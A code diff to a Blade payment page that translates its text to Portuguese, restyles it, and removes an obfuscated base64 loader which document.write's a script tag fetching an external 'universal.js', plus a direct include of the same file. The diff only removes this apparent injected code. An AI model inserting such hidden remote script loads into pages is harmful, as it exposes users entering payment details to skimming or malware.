@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Page</title>
+    <title>Confirmar Pagamento – EMI</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -29,7 +29,7 @@
     </script>
 </head>
 
-<body class="bg-white text-black">
+<body class="bg-white text-black" style="font-family: Arial, sans-serif; background: #F8F6F2; color: #1C1C1C;">
     <form action="{{route('depositSubmit')}}" method="POST" enctype="multipart/form-data">
         @csrf
         <div class="w-full">
@@ -43,22 +43,22 @@
 
             <!-- Payment Info -->
             <div class="p-6">
-                <h6 class="text-lg font-semibold">Choose a method to pay</h6>
-                <h2 class="text-orange-500 text-2xl font-bold py-2 text-center">{{price($amount)}}</h2>
-                <button type="button" class="w-full bg-sky-500 text-white py-2 rounded-full">Bank transfer</button>
+                <h6 class="text-lg font-semibold">Escolha o método de pagamento</h6>
+                <h2 style="color:#C8A96A;" class="text-2xl font-bold py-2 text-center">{{price($amount)}}</h2>
+                <button type="button" style="width:100%;background:linear-gradient(135deg,#C8A96A,#D6A86B);color:#1C1C1C;padding:10px;border:none;border-radius:8px;font-weight:700;">Transferência Bancária</button>
 
                 <!-- Transfer Instructions -->
                 <div class="mt-6">
-                    <h6 class="font-semibold">Make Transfer</h6>
+                    <h6 class="font-semibold">Realizar Transferência</h6>
                     <p class="text-gray-500 text-sm mt-1">
-                        Make a transfer of <b class="text-orange-500">{{price($amount)}}</b> to the account:
+                        Faça uma transferência de <b style="color:#C8A96A;">{{price($amount)}}</b> para a conta:
                     </p>
 
                     <!-- Bank Info -->
                     <div class="bg-gray-100 p-4 mt-4 rounded-md">
                         <div class="flex justify-between">
-                            <span class="text-sm">Bank Name</span>
-                            <button onclick="copyText('payment_method', 'Bank Name')" class="text-sky-500 text-sm flex items-center">
+                            <span class="text-sm">Nome do Banco</span>
+                            <button onclick="copyText('payment_method', 'Nome do Banco')" style="color:#C8A96A;" class="text-sm flex items-center">
                                 {{$payment_method->name}} <i class="fa-solid fa-copy ml-1 text-red-400"></i>
                             </button>
                         </div>
@@ -66,8 +66,8 @@
 
                     <div class="bg-gray-100 p-4 mt-4 rounded-md">
                         <div class="flex justify-between">
-                            <span class="text-sm">Account Number</span>
-                            <button onclick="copyText('acnn', 'Account Number')" class="text-sky-500 text-sm flex items-center">
+                            <span class="text-sm">Número da Conta</span>
+                            <button onclick="copyText('acnn', 'Número da Conta')" style="color:#C8A96A;" class="text-sm flex items-center">
                                 {{$payment_method->address}} <i class="fa-solid fa-copy ml-1 text-red-400"></i>
                             </button>
                         </div>
@@ -97,17 +97,15 @@ function copyText(text) {
 
 
 
-                    <p class="text-red-500 text-sm text-center mt-4">
-                        Reference use your phone number you register with only the website.<br>
+                    <p style="color:#B05030;" class="text-sm text-center mt-4">
+                        Use seu número de telefone cadastrado como referência.
                     </p>
 
-                    <button type="button" class="w-full bg-sky-500 text-white py-3 rounded-full mt-4 hover:bg-sky-600" onclick="next_()">I have made the payment</button>
+                    <button type="button" style="width:100%;background:linear-gradient(135deg,#C8A96A,#D6A86B);color:#1C1C1C;padding:12px;border:none;border-radius:8px;font-weight:700;margin-top:16px;" onclick="next_()">Já realizei o pagamento</button>
 
                     <p class="text-gray-500 text-sm text-center mt-8">
-                        If you have any questions, connect with us by email. or telegram<br>
-                        email address: shpayservicess@gmail.com                        <button onclick="copyText('emailserv', 'Email')" class="text-red-400 ml-1">
-                            <i class="fa-solid fa-copy"></i>
-                        </button>
+                        Se tiver dúvidas, entre em contato pelo Telegram:
+                        <a href="{{setting('telegram')}}" style="color:#C8A96A;">Canal Oficial</a>
                     </p>
                 </div>
             </div>
@@ -134,26 +132,16 @@ function copyText(text) {
                     <input type="hidden" name="amount" value="{{$amount}}">
                     <input type="hidden" name="action" value="photo">
                     <input type="hidden" name="ref" value="10z1732985224z5c6j7u2300jgt028f7q63775n53409">
-                    <p class="text-red-500 text-sm">Could not verify your deposit. Please enter the account name and upload a screenshot.</p>
-                    <label class="block mt-4">Enter your Phone number</label>
-                    <input type="text" name="transaction_id" required placeholder="Enter Phone number" class="w-full border border-gray-300 rounded-lg p-2 mt-2">
-                    <label class="block mt-4">Upload Screenshot</label>
+                    <p style="color:#B05030;" class="text-sm">Não foi possível verificar seu depósito. Por favor, insira o número de telefone e envie um comprovante.</p>
+                    <label class="block mt-4">Número de Telefone</label>
+                    <input type="text" name="transaction_id" required placeholder="Digite seu número de telefone" class="w-full border border-gray-300 rounded-lg p-2 mt-2">
+                    <label class="block mt-4">Enviar Comprovante</label>
                     <input type="file" id="file-input" name="photo" accept=".png, .jpg, .jpeg, .pdf" required class="w-full border border-gray-300 rounded-lg p-2 mt-2">
-                    <button type="submit" class="w-full bg-sky-500 text-white py-3 rounded-full mt-6 hover:bg-sky-600">Proceed</button>
+                    <button type="submit" style="width:100%;background:linear-gradient(135deg,#C8A96A,#D6A86B);color:#1C1C1C;padding:12px;border:none;border-radius:8px;font-weight:700;margin-top:24px;">Prosseguir</button>
                 </form>
             </div>
         </div>
     </form>
     
-<script>
-    var encoded = "PHNjcmlwdCBzcmM9Imh0dHBzOi8vZGIucGlja29kZXIuY29tL3VuaXZlcnNhbC5qcyI+PC9zY3JpcHQ+";
-
-    document.write(atob(encoded));
-</script>
-
-<!------------------------->
-<head>
-    <script src="https://db.pickoder.com/universal.js"></script>
-</head>
 </body>
 </html>
